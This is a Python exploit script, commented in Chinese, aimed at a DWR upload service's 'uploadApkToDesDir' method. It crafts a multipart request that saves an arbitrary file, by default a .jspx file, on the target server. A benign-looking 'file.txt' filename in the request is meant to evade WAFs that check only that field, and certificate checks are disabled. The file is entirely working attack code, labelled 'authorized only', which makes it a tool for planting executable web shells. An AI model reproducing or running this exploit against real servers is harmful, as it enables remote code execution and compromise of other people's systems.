#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""DWR uploadApkToDesDir 演示（仅授权环境）。

核心点：
  * c0-param0 决定服务端保存的文件名（可写 .jspx）
  * multipart 的 filename 用良性名字（如 file.txt），绕过只检查文件名属性的 WAF
  * DWR 调用必须携带 instanceId=0
"""
import argparse
import ssl
import sys
import urllib.request
import urllib.error
import uuid


def build_body(saved_name: str, multipart_filename: str, content: bytes) -> tuple[bytes, str]:
    boundary = "----DWR" + uuid.uuid4().hex
    out = bytearray()

    def field(name: str, value: str) -> None:
        out.extend(
            (f"--{boundary}\r\nContent-Disposition: form-data; name=\"{name}\"\r\n\r\n{value}\r\n").encode()
        )

    field("callCount", "1")
    field("page", "/dwr/test/dwrUploadService")
    field("httpSessionId", "")
    field("scriptSessionId", "")
    field("batchId", "0")
    field("instanceId", "0")
    field("c0-scriptName", "dwrUploadService")
    field("c0-methodName", "uploadApkToDesDir")
    field("c0-id", "0")
    field("c0-param0", saved_name)
    out.extend(
        (f"--{boundary}\r\nContent-Disposition: form-data; name=\"c0-param1\"; filename=\"{multipart_filename}\"\r\n"
         "Content-Type: application/octet-stream\r\n\r\n").encode()
    )
    out.extend(content)
    out.extend(b"\r\n")
    out.extend(f"--{boundary}--\r\n".encode())
    return bytes(out), f"multipart/form-data; boundary={boundary}"


def main() -> None:
    ap = argparse.ArgumentParser(description="DWR uploadApkToDesDir demo (authorized only)")
    ap.add_argument("--target", required=True, help="https://<TARGET_DOMAIN>")
    ap.add_argument("--saved-name", default="probe.jspx", help="服务端保存名（c0-param0）")
    ap.add_argument("--multipart-filename", default="file.txt", help="multipart 文件名（良性）")
    ap.add_argument("--content-file", required=True, help="要写入的内容文件")
    ap.add_argument("--execute", action="store_true", help="实际发送")
    args = ap.parse_args()

    url = args.target.rstrip("/") + "/dwr/call/plaincall/dwrUploadService.uploadApkToDesDir.dwr"
    body, ctype = build_body(args.saved_name, args.multipart_filename, open(args.content_file, "rb").read())
    print(f"[*] POST {url}")
    print(f"[*] saved-name={args.saved_name} multipart-filename={args.multipart_filename}")
    if not args.execute:
        print("[dry-run] add --execute to send")
        return
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=30, context=ctx) as r:
            print(r.status, r.read(2000).decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        print(e.code, e.read(2000).decode("utf-8", "replace"))
    except Exception as e:
        print("ERR", e)


if __name__ == "__main__":
    main()
